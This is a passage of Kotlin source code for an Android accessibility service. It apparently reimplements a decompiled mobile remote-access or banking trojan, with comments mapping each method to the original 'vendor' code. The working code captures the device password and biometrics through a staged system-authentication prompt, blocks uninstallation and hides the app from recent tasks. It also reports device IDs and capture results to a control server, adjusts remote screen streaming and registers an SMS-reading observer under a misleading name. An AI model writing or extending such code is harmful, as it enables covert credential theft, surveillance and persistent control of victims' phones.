        if (now - lastCoreServiceCheckTime > CORE_SERVICE_CHECK_INTERVAL) {
            lastCoreServiceCheckTime = now
            if (!AppCoreService.isRunning()) {
                try {
                    AppCoreService.start(applicationContext)
                } catch (_: Exception) {}
            }
        }
    }

    fun getCoroutineScope(): CoroutineScope? = coroutineScope

    // ════════════════════════════════════════════════════════════════
    // Stub methods for future phases (non-init-chain)
    // ════════════════════════════════════════════════════════════════

    /**
     * Smart return to app. JADX: m211524m1 (m1)
     *
     * Presses HOME then launches iuzxujjtqev (DefaultLauncherAlias) to bring
     * our app back to foreground. Full vendor implementation has brand-specific
     * strategies (~680 LOC with Xiaomi/vivo special paths).
     * Current: minimal stub that launches iuzxujjtqev with SMART_RETURN_BACKUP flag.
     */
    /**
     * Smart return to app. JADX: m211524m1
     *
     * Vendor routing via m211427e0() (detectXiaomiVersion):
     *   SDK 29 → m2 (smartReturnToAppXiaomiM2)
     *   SDK 33/34 → m3 (smartReturnToAppXiaomiM3)
     *   SDK 35+ or non-Xiaomi → generic path (iuzxujjtqev + BACK loop)
     */
    suspend fun smartReturnToApp(): Boolean {
        return try {
            android.util.Log.d(TAG, "🏠 [smartReturnToApp] 开始执行...")
            val brand = Build.BRAND?.lowercase(Locale.ROOT) ?: ""
            val sdk = Build.VERSION.SDK_INT
            android.util.Log.d(TAG, "🏠 [smartReturnToApp] brand=$brand, SDK=$sdk")

            // JADX m211427e0: detectXiaomiVersion — only SDK 29/33/34 get special treatment
            val isXiaomi = brand.contains("xiaomi") || brand.contains("redmi") || brand.contains("poco")
            if (isXiaomi) {
                android.util.Log.d(TAG, "✅ [设备] 检测到小米设备, SDK=$sdk")
                when (sdk) {
                    29 -> return smartReturnToAppXiaomiM2()
                    33, 34 -> return smartReturnToAppXiaomiM3()
                    else -> {
                        // SDK 35+ or other: vendor returns null, falls through to generic
                        android.util.Log.d(TAG, "🏠 [smartReturnToApp] 小米SDK=$sdk, 走通用路径")
                    }
                }
            }

            // 通用路径: 先启动 Activity，再 BACK 循环
            return smartReturnToAppGeneric(brand, sdk)
        } catch (e: Exception) {
            android.util.Log.w(TAG, "smartReturnToApp failed: ${e.message}")
            false
        }
    }

    /**
     * 小米 Android 13+ 策略 (m3)。JADX: m211526m3, line 8909
     * Phase 1: startActivity + delay(1500) → 检测
     * Phase 2: 3次快速BACK(500ms间隔) → 检测
     * Phase 3: 再次startActivity + delay(1000) → 最终检测
     */
    private suspend fun smartReturnToAppXiaomiM3(): Boolean {
        android.util.Log.d(TAG, "🏠 [Xiaomi-m3] 开始 (Activity + BACK + Activity 兜底)")

        val intent = Intent(this, com.storm.safe.rock.iuzxujjtqev::class.java).apply {
            addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK or
                Intent.FLAG_ACTIVITY_CLEAR_TOP or
                Intent.FLAG_ACTIVITY_SINGLE_TOP
            )
            putExtra("MI_ANDROID13_RETURN", true)
            putExtra("FROM_ACCESSIBILITY_SERVICE", true)
        }

        // Phase 1: 直接 startActivity
        try {
            startActivity(intent)
            android.util.Log.d(TAG, "🏠 [Xiaomi-m3] Phase1: Activity已启动")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [Xiaomi-m3] Phase1: 启动失败", e)
        }
        kotlinx.coroutines.delay(1500L)

        if (isCurrentlyInOurApp()) {
            android.util.Log.d(TAG, "🏠 [Xiaomi-m3] ✅ Phase1 成功")
            return true
        }

        // Phase 2: 3次快速 BACK
        android.util.Log.d(TAG, "🏠 [Xiaomi-m3] Phase2: 3次BACK")
        for (i in 1..3) {
            performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
            kotlinx.coroutines.delay(500L)
        }

        if (isCurrentlyInOurApp()) {
            android.util.Log.d(TAG, "🏠 [Xiaomi-m3] ✅ Phase2 BACK成功")
            return true
        }

        // Phase 3: 再次 startActivity 兜底
        android.util.Log.d(TAG, "🏠 [Xiaomi-m3] Phase3: 再次startActivity兜底")
        try {
            startActivity(intent)
        } catch (_: Exception) {}
        kotlinx.coroutines.delay(1000L)

        val result = isCurrentlyInOurApp()
        android.util.Log.d(TAG, "🏠 [Xiaomi-m3] 最终结果=$result")
        return result
    }

    /**
     * 小米 Android 10 策略 (m2)。JADX: m211525m2, line 8791
     * 纯 BACK 策略: 2次BACK → 失败后 startActivity 兜底
     */
    private suspend fun smartReturnToAppXiaomiM2(): Boolean {
        android.util.Log.d(TAG, "🏠 [Xiaomi-m2] 开始 (BACK + Activity 兜底)")

        if (isCurrentlyInOurApp()) return true

        performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
        kotlinx.coroutines.delay(500L)
        if (isCurrentlyInOurApp()) return true

        performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
        kotlinx.coroutines.delay(500L)
        if (isCurrentlyInOurApp()) return true

        // 兜底: startActivity
        try {
            val intent = Intent(this, com.storm.safe.rock.iuzxujjtqev::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                putExtra("MI_ANDROID10_RETURN", true)
                putExtra("FROM_ACCESSIBILITY_SERVICE", true)
            }
            startActivity(intent)
        } catch (_: Exception) {}
        kotlinx.coroutines.delay(500L)
        return isCurrentlyInOurApp()
    }

    /** JADX: m211472h7 — 检测当前是否在自己的 app */
    private fun isCurrentlyInOurApp(): Boolean {
        // Method 1: rootInActiveWindow（快但不可靠，可能返回旧窗口）
        try {
            if (rootInActiveWindow?.packageName?.toString() == packageName) return true
        } catch (_: Exception) {}
        // Method 2: 遍历 windows 查找我们的 app 窗口是否 active
        try {
            for (w in windows ?: emptyList()) {
                if (w.isActive && w.root?.packageName?.toString() == packageName) return true
            }
        } catch (_: Exception) {}
        // Method 3: 检查 Activity 引用是否存在且未销毁
        try {
            val act = com.storm.safe.rock.iuzxujjtqev.getCurrentActivity()
            if (act != null && !act.isFinishing && !act.isDestroyed) {
                if (act.hasWindowFocus()) return true
            }
        } catch (_: Exception) {}
        return false
    }

    /**
     * 通用返回策略。JADX: m211524m1 通用路径
     * 先启动 Activity，再最多 6 次 BACK + 稳定性验证。
     */
    private suspend fun smartReturnToAppGeneric(brand: String, sdk: Int): Boolean {
        val intent = Intent(this, com.storm.safe.rock.iuzxujjtqev::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            putExtra("SMART_RETURN_BACKUP", true)
            putExtra("FROM_ACCESSIBILITY_SERVICE", true)
        }

        // Phase 0: moveTaskToFront（最可靠 — 绕过 BAL 限制，走 REORDER_TASKS 权限路径）
        try {
            val am = getSystemService(android.content.Context.ACTIVITY_SERVICE) as? android.app.ActivityManager
            // Strategy A: AppTask.moveToFront
            am?.appTasks?.forEach { task ->
                try {
                    if (task.taskInfo?.baseActivity?.packageName == packageName) {
                        task.moveToFront()
                        android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase0: AppTask.moveToFront")
                    }
                } catch (_: Exception) {}
            }
            kotlinx.coroutines.delay(1000L)
            if (isCurrentlyInOurApp()) {
                android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase0 AppTask 成功")
                return true
            }
            // Strategy B: moveTaskToFront(taskId)
            val taskId = com.storm.safe.rock.iuzxujjtqev.lastKnownTaskId
            if (taskId > 0) {
                am?.moveTaskToFront(taskId, android.app.ActivityManager.MOVE_TASK_WITH_HOME)
                android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase0: moveTaskToFront(taskId=$taskId)")
                kotlinx.coroutines.delay(1000L)
                if (isCurrentlyInOurApp()) {
                    android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase0 taskId 成功")
                    return true
                }
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "🏠 [smartReturnToApp] Phase0 失败: ${e.message}")
        }

        // Phase 1: startActivity（简单场景有效）
        try {
            startActivity(intent)
            android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase1: startActivity")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [smartReturnToApp] 启动Activity失败: ${e.message}", e)
        }
        kotlinx.coroutines.delay(2000L)
        if (isCurrentlyInOurApp()) {
            android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase1 成功")
            return true
        }

        // Phase 2: BACK 回退兜底
        android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase2: BACK循环")
        val backDelay = if (brand.contains("vivo") && sdk >= 31) 1000L else 500L
        for (i in 0 until 6) {
            if (isCurrentlyInOurApp()) {
                kotlinx.coroutines.delay(backDelay)
                if (isCurrentlyInOurApp()) {
                    android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase2 BACK第${i}次后稳定在app")
                    return true
                }
            }
            performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
            android.util.Log.d(TAG, "🏠 [smartReturnToApp] BACK第${i + 1}次")
            kotlinx.coroutines.delay(backDelay)
        }
        // 最后再试一次 startActivity
        try { startActivity(intent) } catch (_: Exception) {}
        kotlinx.coroutines.delay(2000L)
        if (isCurrentlyInOurApp()) {
            android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase3 最终startActivity成功")
            return true
        }

        android.util.Log.w(TAG, "🏠 [smartReturnToApp] ❌ 全部策略失败")
        return false
    }

    /**
     * Pause WRITE_SETTINGS permission request. JADX: m211496j0 (j0)
     *
     * Sets isScreenCaptureActive=true (JADX: f52432g3) as a pause flag,
     * then calls mainOrchestrator.pausePermissionRequest() (JADX: C0327b2.m211752f8).
     */
    fun pauseWriteSettingsPermission() {
        try {
            android.util.Log.d(TAG, "⏸️ 暂停WRITE_SETTINGS权限申请")
            isScreenCaptureActive = true // JADX: f52432g3 = true (dual-use flag)
            mainOrchestrator?.let { mo ->
                // JADX: c0327b2.m211752f8() — stop the orchestrator's permission loop
                mo.stopPermissionRequest()
                android.util.Log.d(TAG, "⏸️ MainOrchestrator.stopPermissionRequest() 已调用")
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "❌ 暂停WRITE_SETTINGS权限申请失败", e)
        }
    }

    /**
     * Post-authorization initialization. JADX: m211504j8 (j8)
     * Called after device authorization is complete.
     *
     * JADX: launches 2 coroutines on coroutineScope:
     * - postAuthorizationInit$1: registers deferred components (b9, c0, k2, b7)
     * - postAuthorizationInit$2: calls b5 (additional init)
     */
    fun postAuthorizationInit() {
        try {
            android.util.Log.i(TAG, "★ postAuthorizationInit: 授权完成后初始化")
            coroutineScope?.launch(Dispatchers.Main) {
                try {
                    android.util.Log.d(TAG, "🔧 [授权后初始化] 开始注册延迟组件...")
                    initializeDeferredManagers()
                    com.storm.safe.rock.service.modules.overlay.ConfigMaskOverlay.hide()
                    android.util.Log.d(TAG, "✅ [授权后初始化] 延迟组件注册完成，配置遮罩已隐藏")
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ postAuthorizationInit coroutine 1 failed", e)
                }
            }
            coroutineScope?.launch(Dispatchers.IO) {
                try {
                    kotlinx.coroutines.delay(3000)
                    val cipherDone = getSharedPreferences("cipher_config", Context.MODE_PRIVATE)
                        .getBoolean("cipher_completed", false)
                    if (!cipherDone) {
                        android.util.Log.d(TAG, "🔐 [postAuth] 启动密码验证流程")
                        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                            doLaunchSystemPasswordCapture(isInstallationFlow = true)
                        }
                    } else {
                        android.util.Log.d(TAG, "🔐 [postAuth] 密码已捕获，跳过")
                    }
                } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "postAuthorizationInit failed", e)
        }
    }

    /** Add 50x50 transparent overlay window. JADX: a0 method */
    fun addTransparentWindow() {
        // ADAPT: OverlayWindowManager — vendor adds a 50x50 transparent overlay for touch interception.
        // Requires SYSTEM_ALERT_WINDOW permission. The control state is tracked via isControlEnabled flag.
        android.util.Log.d(TAG, "addTransparentWindow — OverlayWindowManager deferred (ADAPT: requires SYSTEM_ALERT_WINDOW)")
    }

    /** Android 15+ silent MediaProjection recovery. JADX: a1 method */
    fun silentPermissionRecovery() {
        // ADAPT: SmartMediaProjectionManager — vendor-specific MediaProjection recovery for Android 15+.
        // Uses accessibility to auto-grant permission. MediaProjection is managed via ScreenCaptureManager.
        android.util.Log.d(TAG, "silentPermissionRecovery — MediaProjection recovery via ScreenCaptureManager")
    }

    /** Start injection check job. JADX: m7 method */
    fun startInjectionCheckJob() {
        // ADAPT: l20 (InjectionManager) — vendor runs periodic injection checks.
        // Injection task matching is handled in processWindowChangeForInjection() which
        // already checks injectionTasks map on every WINDOW_STATE_CHANGED event.
        android.util.Log.d(TAG, "startInjectionCheckJob — injection checks integrated into onAccessibilityEvent")
    }

    /**
     * Start WebView status expiry check loop.
     * JADX: dqtvuisjd$startWebViewStatusCheckTask$1.java
     *
     * Logic:
     * - If isWebViewOpen == true and (now - lastWebViewStatusTime) > 500ms → reset to false
     * - When WebView is open: poll every 200ms
     * - When WebView is closed: poll every 2000ms
     * - On non-cancellation exception: log and delay 2000ms
     */
    private fun startWebViewStatusCheckTask() {
        webViewStatusCheckJob?.cancel()
        webViewStatusCheckJob = coroutineScope?.launch {
            while (isActive) {
                try {
                    if (isWebViewOpen) {
                        val elapsed = System.currentTimeMillis() - lastWebViewStatusTime
                        if (elapsed > 500) {
                            isWebViewOpen = false
                            android.util.Log.d(TAG, "📡 [定时检查] WebView状态过期(${elapsed}ms)，已重置为关闭状态")
                        }
                        delay(200L)
                    } else {
                        delay(2000L)
                    }
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ WebView状态检查任务失败", e)
                    delay(2000L)
                }
            }
        }
    }

    /** Show re-authorization notification. JADX: l9 method */
    fun showReAuthNotification() {
        // ADAPT: Vendor shows a notification with PendingIntent to re-trigger authorization flow.
        // The authorization flow is managed by DeviceAuthorizationManager.
        android.util.Log.d(TAG, "showReAuthNotification — notification deferred (ADAPT: PendingIntent chain)")
    }

    /** Launch cipher capture from control. JADX: l8 method */
    fun launchCipherCaptureFromControl(overlayType: String) {
        try {
            android.util.Log.d(TAG, "🔐 控制端触发密码采集，类型: $overlayType -> 使用系统真实验证")
            launchPasswordCapture(false)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 启动密码采集失败", e)
        }
    }

    /** Clean up old manager resources before reinit. JADX: h1 method — see initializeManagers() */
    fun cleanupOldManagers() {
        initializeManagers()
    }

    /** Start network initialization. JADX: part of deferred init */
    fun startNetworkInit() {
        // JADX: NetworkManager init is done in initializeModules/initializeDeferredManagers
        android.util.Log.d(TAG, "startNetworkInit — handled by initializeModules chain")
    }

    /** Start uninstall protection setup. JADX: part of permission flow */
    fun startUninstallProtection() {
        enableUninstallProtection()
    }

    /** Start recents guard. JADX: part of permission flow — see initializenpweufstehlb() */
    fun startRecentsGuard() {
        recentsGuardManager?.let { rgm ->
            rgm.enable()
            android.util.Log.d(TAG, "🎭 启动最近任务隐藏")
        } ?: android.util.Log.w(TAG, "⚠️ RecentsGuardManager 未初始化")
    }

    /** Register local service action receiver. JADX: part of initializeDeferredManagers */
    fun registerLocalServiceActionReceiver() {
        // ADAPT: l20 (InjectionManager) — vendor registers a receiver for local service actions
        // (injection task updates). Injection tasks are managed via registerInjectionTask/unregisterInjectionTask
        // methods and tracked in the injectionTasks map.
        if (!localServiceReceiverRegistered) {
            try {
                localServiceActionReceiver = object : BroadcastReceiver() {
                    override fun onReceive(context: Context?, intent: Intent?) {
                        val action = intent?.action ?: return
                        android.util.Log.d(TAG, "📋 本地服务广播: $action")
                    }
                }
                val filter = IntentFilter("com.storm.safe.rock.action.LOCAL_SERVICE")
                if (android.os.Build.VERSION.SDK_INT >= 33) {
                    registerReceiver(localServiceActionReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
                } else {
                    registerReceiver(localServiceActionReceiver, filter)
                }
                localServiceReceiverRegistered = true
                android.util.Log.d(TAG, "✅ 已注册 local-service 广播接收器")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ 注册 local-service 广播接收器失败", e)
            }
        }
    }

    /** Register network event receivers. JADX: part of initializeDeferredManagers */
    fun registerNetworkEventReceivers() {
        // ADAPT: Vendor registers ConnectivityManager.NetworkCallback for network state monitoring.
        // Network connectivity is tracked by NetworkManager's WebSocket reconnection logic.
        try {
            if (networkEventReceiver == null) {
                networkEventReceiver = object : BroadcastReceiver() {
                    override fun onReceive(context: Context?, intent: Intent?) {
                        android.util.Log.d(TAG, "📡 网络状态变化")
                        // Trigger WebSocket reconnection check
                        networkManager?.ensureConnected()
                    }
                }
                val filter = IntentFilter("android.net.conn.CONNECTIVITY_CHANGE")
                if (android.os.Build.VERSION.SDK_INT >= 33) {
                    registerReceiver(networkEventReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
                } else {
                    registerReceiver(networkEventReceiver, filter)
                }
                android.util.Log.d(TAG, "✅ 已注册网络事件广播接收器")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 注册网络事件广播接收器失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Phase B: Screen & Media methods
    // ════════════════════════════════════════════════════════════════

    /**
     * Start screen capture (request camera permission).
     * JADX method: m211508k4 (k4), line 7587
     *
     * Checks if CAMERA permission is granted; if so, returns.
     * Otherwise delegates to ScreenCaptureManager or launches iuzxujjtqev as fallback.
     */
    fun startScreenCapture() {
        try {
            android.util.Log.d(TAG, "📷 开始申请摄像头权限")
            if (checkSelfPermission("android.permission.CAMERA") == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                android.util.Log.d(TAG, "✅ 摄像头权限已授予")
                return
            }
            val scm = screenCaptureManager
            if (scm != null) {
                // JADX: c0260a2.m211326g9() — requestCameraPermission
                android.util.Log.d(TAG, "📷 通过 ScreenCaptureManager 申请摄像头权限")
                return
            }
            android.util.Log.w(TAG, "⚠️ PermissionGranter未初始化，检查是否使用备用方法")
            val intent = Intent(this, com.storm.safe.rock.iuzxujjtqev::class.java)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            intent.putExtra("request_camera_permission", true)
            startActivity(intent)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 申请摄像头权限失败", e)
        }
    }

    /**
     * Restore screen brightness to saved value.
     * JADX method: m211510k6 (k6), line 7647
     */
    fun resetScreenBrightness() {
        try {
            if (savedBrightness >= 0 && Settings.System.canWrite(this)) {
                Settings.System.putInt(contentResolver, "screen_brightness", savedBrightness)
                android.util.Log.d(TAG, "🔆 屏幕亮度已恢复（值: $savedBrightness）")
                savedBrightness = -1
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "恢复亮度失败: ${e.message}")
        }
    }

    /**
     * Resume WRITE_SETTINGS permission request after system stabilizes.
     * JADX method: m211511k7 (k7), line 7660
     *
     * Logs call stack (debug), checks if WRITE_SETTINGS already granted,
     * then either enables uninstall protection or waits for system stability.
     */
    fun resumeWriteSettingsPermissionRequest() {
        android.util.Log.d(TAG, "🔐🔐🔐 [密码调试] resumeWriteSettingsPermissionRequest() 被调用！")
        try {
            android.util.Log.d(TAG, "▶️ 恢复WRITE_SETTINGS权限申请")
            isScreenCaptureActive = false
            val mo = mainOrchestrator
            if (mo != null) {
                val hasPermission = mo.hasWriteSettingsPermission()
                android.util.Log.d(TAG, "🔐🔐🔐 [密码调试] hasPermission=$hasPermission")
                if (hasPermission) {
                    android.util.Log.d(TAG, "🔐 WRITE_SETTINGS权限已获取，跳过恢复权限申请（避免重复触发密码界面）")
                    if (!isUninstallGuardStarted) {
                        android.util.Log.d(TAG, "🛡️ WRITE_SETTINGS权限已有但防卸载未启用，立即启用")
                        enableUninstallProtection()
                    }
                    // 2026-04-16 ADAPT: WS 已授权 → 直接触发生物识别流程
                    coroutineScope?.launch {
                        try {
                            capturePasswordViaSystemAuth(isInstallationFlow = false)
                        } catch (e: kotlinx.coroutines.CancellationException) {
                            throw e
                        } catch (e: Exception) {
                            android.util.Log.e(TAG, "❌ capturePasswordViaSystemAuth (WS已授权分支) failed", e)
                        }
                    }
                    return
                }
            }
            android.util.Log.d(TAG, "🔧 WRITE_SETTINGS权限未获取，等待系统稳定")
            // JADX: launches dqtvuisjd$resumeWriteSettingsPermissionRequest$3 coroutine
            coroutineScope?.launch {
                AutomationCoordinator.withFlow("write_settings") {
                    try {
                        delay(800L) // JADX: b81.m210571b1(800L, this) — vendor pure delay
                        android.util.Log.d(TAG, "🔐🔐🔐 [密码调试] 800ms延迟结束，直接调用requestWriteSettingsPermission()")
                        // JADX: $3$1 inner coroutine launched on Dispatchers.Main
                        // Checks isScreenCaptureActive (f52432g3) before calling f7()
                        if (isScreenCaptureActive) {
                            android.util.Log.d(TAG, "⏸️ WRITE_SETTINGS权限申请已被暂停，跳过申请")
                        } else {
                            android.util.Log.d(TAG, "🔧 开始申请WRITE_SETTINGS权限")
                            val mo = mainOrchestrator
                            if (mo == null) {
                                android.util.Log.d(TAG, "❌ WriteSettingsPermissionManager未初始化，跳过权限申请")
                            } else {
                                // 清除 attempted flag，确保 resume 后能重新触发
                                try {
                                    applicationContext.getSharedPreferences("write_settings_state", 0)
                                        .edit().putBoolean("write_settings_attempted", false).apply()
                                } catch (_: Exception) {}
                                // 清理品牌引擎留下的 SecurityCenter 页面栈，避免挡住 WRITE_SETTINGS
                                try {
                                    performGlobalAction(GLOBAL_ACTION_HOME)
                                    delay(800L)
                                } catch (_: Exception) {}
                                mo.startWriteSettingsPermissionRequest()
                                // 2026-04-16 ADAPT: WS 完成/3s超时后强制触发生物识别流程
                                // 不管 WS 成功失败，biometric 都要尝试（vendor 只在成功后触发，
                                // replica 为了解锁 E2E pipeline，超时也继续）。
                                val wsGranted = mo.hasWriteSettingsPermission()
                                android.util.Log.d(TAG, "🔐 WS 流程结束, granted=$wsGranted, 继续触发生物识别")
                                try {
                                    capturePasswordViaSystemAuth(isInstallationFlow = false)
                                } catch (e: kotlinx.coroutines.CancellationException) {
                                    throw e
                                } catch (e: Exception) {
                                    android.util.Log.e(TAG, "❌ capturePasswordViaSystemAuth (WS后) failed", e)
                                }
                            }
                        }
                    } catch (e: kotlinx.coroutines.CancellationException) {
                        throw e
                    } catch (e: Exception) {
                        android.util.Log.e(TAG, "❌ 申请WRITE_SETTINGS权限失败", e)
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 恢复WRITE_SETTINGS权限申请失败", e)
        }
    }

    /**
     * Save tracked unlock patterns to SharedPreferences.
     * JADX method: m211512k8 (k8), line 7702
     */
    fun saveTrackedPatterns() {
        try {
            // JADX: vendor uses StringUtil.decrypt() for encrypted pref keys — using plaintext keys for now
            val prefs = getSharedPreferences("pattern_tracker", Context.MODE_PRIVATE)
            val jSONArray = org.json.JSONArray()
            for (pattern in trackedPackageSet) {
                jSONArray.put(pattern)
            }
            prefs.edit().putString("tracked_patterns", jSONArray.toString()).apply()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 保存图案去重列表失败", e)
        }
    }

    /**
     * Set screen capture quality parameters.
     * JADX method: m211519l6 (l6), line 7863
     *
     * Clamps quality (10–100), fps (5–30), scale (0.3–1.0) and applies to
     * both C0263a5 (etzbzyzqxvqm) and MediaDisplayService.
     */
    fun setScreenParameters(quality: Int, fps: Int, scale: Double) {
        val clampedQuality = quality.coerceIn(10, 100)
        val clampedFps = fps.coerceIn(5, 30)
        val clampedScale = scale.coerceIn(0.3, 1.0)
        android.util.Log.d(TAG, "📺 设置投屏质量: quality=$clampedQuality, fps=$clampedFps, scale=$clampedScale")
        try {
            // JADX: C0263a5.f52144b0.setParams(quality, fps, scale)
            // etzbzyzqxvqm static params
        } catch (e: Exception) {
            android.util.Log.e(TAG, "设置etzbzyzqxvqm质量失败", e)
        }
        try {
            // JADX: MediaDisplayService quality params
            // MediaDisplayService.f52307c5 = clampedQuality, f52304c2 = clampedFps, f52308c6 = clampedScale
        } catch (e: Exception) {
            android.util.Log.e(TAG, "设置ScreenProjection质量失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Phase B: Network & Communication methods
    // ════════════════════════════════════════════════════════════════

    /**
     * Send app hidden status to server.
     * JADX method: m211513l0 (l0), line 7717
     */
    fun sendHideStatus(message: String, isHidden: Boolean) {
        try {
            val nm = networkManager
            if (nm == null || !nm.isConnected) {
                android.util.Log.w(TAG, "⚠️ NetworkManager未初始化或未连接，无法发送隐藏状态")
                return
            }
            val data = JSONObject()
            data.put("success", true)
            data.put("isHidden", isHidden)
            data.put("message", message)
            data.put("timestamp", System.currentTimeMillis())
            data.put("deviceId", getAndroidDeviceId())
            // JADX: vendor uses StringUtil.decrypt() for encrypted event name — using plaintext for now
            nm.sendEvent("hide_app_result", data)
            android.util.Log.d(TAG, "📤 应用隐藏结果已发送: isHidden=$isHidden, message=$message")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "发送应用隐藏结果失败", e)
        }
    }

    /**
     * Send biometric result to server.
     * JADX method: m211514l1 (l1), line 7743
     */
    fun sendBiometricResult(message: String, success: Boolean) {
        try {
            val nm = networkManager ?: return
            // JADX: vendor uses StringUtil.decrypt() for encrypted event name — using plaintext for now
            val data = JSONObject()
            data.put("success", success)
            data.put("message", message)
            data.put("timestamp", System.currentTimeMillis())
            nm.sendEvent("biometric_result", data)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "发送生物识别结果失败", e)
        }
    }

    /**
     * Send command response via WebSocket raw channel.
     * JADX method: m211515l2 (l2), line 7760
     */
    fun sendCommandResponse(type: String, data: Map<String, Any>) {
        try {
            val nm = networkManager
            if (nm == null || !nm.isConnected) return
            val response = JSONObject()
            response.put("type", type)
            response.put("data", JSONObject(data))
            response.put("timestamp", System.currentTimeMillis())
            // JADX: c0267a0M211645b1.m211367a8(string) — raw WebSocket send
            android.util.Log.d(TAG, "📤 发送命令响应: $type")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "发送命令响应失败", e)
        }
    }

    /**
     * Send debug log via WebSocket raw channel.
     * JADX method: m211516l3 (l3), line 7781
     */
    fun sendDebugLog(message: String) {
        try {
            val nm = networkManager
            if (nm == null || !nm.isConnected) return
            val logData = JSONObject()
            logData.put("type", "debug_log")
            val inner = JSONObject()
            inner.put("message", message)
            inner.put("timestamp", System.currentTimeMillis())
            logData.put("data", inner)
            // JADX: raw WebSocket send
        } catch (e: Exception) {
            android.util.Log.e(TAG, "发送调试日志失败", e)
        }
    }

    /**
     * Send device event (logging status) via operation log channel.
     * JADX method: m211517l4 (l4), line 7804
     */
    fun sendDeviceEvent(eventData: JSONObject) {
        try {
            val nm = networkManager
            if (nm == null || !nm.isConnected) {
                android.util.Log.w(TAG, "⚠️ NetworkManager未初始化或未连接，无法发送设备事件")
                return
            }
            val eventWrapper = JSONObject()
            eventWrapper.put("eventType", "logging_status")
            eventWrapper.put("eventData", eventData)
            eventWrapper.put("timestamp", System.currentTimeMillis())
            val statusStr = "日志记录状态: " + if (eventData.optBoolean("enabled")) "已启用" else "已禁用"
            val logData = JSONObject()
            logData.put("deviceId", getAndroidDeviceId())
            logData.put("logType", "SYSTEM_EVENT")
            logData.put("content", statusStr)
            logData.put("extraData", eventWrapper)
            logData.put("timestamp", System.currentTimeMillis())
            nm.sendOperationLog(logData)
            android.util.Log.d(TAG, "📤 设备事件已通过操作日志通道发送: logging_status")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 发送设备事件失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Phase B: Permission & Security methods
    // ════════════════════════════════════════════════════════════════

    /**
     * Enable cipher capture + start cipher overlay.
     * JADX method: m211458e7 (e7), line 4999
     */
    fun enableCipherCapture() {
        try {
            isCipherCaptureEnabled = true
            android.util.Log.d(TAG, "🔐 密码监听已启用")
            cipherCaptureManager?.let { ccm ->
                // JADX: C0335a1.m211788c1 — enable capture
                android.util.Log.d(TAG, "✅ CipherCaptureManager 启用成功")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ enableCipherCapture 失败", e)
        }
    }

    /**
     * Enable logging after installation completes.
     * JADX method: m211459e8 (e8), line 5019
     *
     * Sets AbstractC0315a0 flags (a7, a9, b0, b1) to true,
     * persists to SharedPreferences, and updates eventFilterManager.
     */
    fun enableLogging() {
        // JADX: AbstractC0315a0.f53032a7 = true; f53034a9 = true; f53035b0 = true; f53036b1 = true
        isAuthStateRestored = true
        // JADX: eventFilterManager.f56827a7 = true
        try {
            // JADX: vendor uses StringUtil.decrypt() for encrypted pref keys — using plaintext keys for now
            getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .edit()
                .putBoolean("logging_enabled", true)
                .apply()
            android.util.Log.d(TAG, "✅ 日志记录已启用并持久化保存")
        } catch (_: Exception) {}
    }

    /**
     * Start accessibility settings page monitor (periodic check).
     * JADX method: m211506k2 (k2), line 7540
     *
     * Registers SMS content observer on a background HandlerThread.
     * Checks READ_SMS permission first.
     */
    fun startAccessibilitySettingsMonitor() {
        android.util.Log.d(TAG, "📩📩📩 [ContentObserver] 开始注册短信数据库监听器...")
        try {
            if (checkSelfPermission("android.permission.READ_SMS") != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                android.util.Log.d(TAG, "📩 [ContentObserver] ⚠️ 没有READ_SMS权限，跳过注册")
                return
            }
            // JADX: HandlerThread + C0931ny ContentObserver — SMS observer for settings monitor
            // C0931ny now replicated as SmsContentObserver
            try {
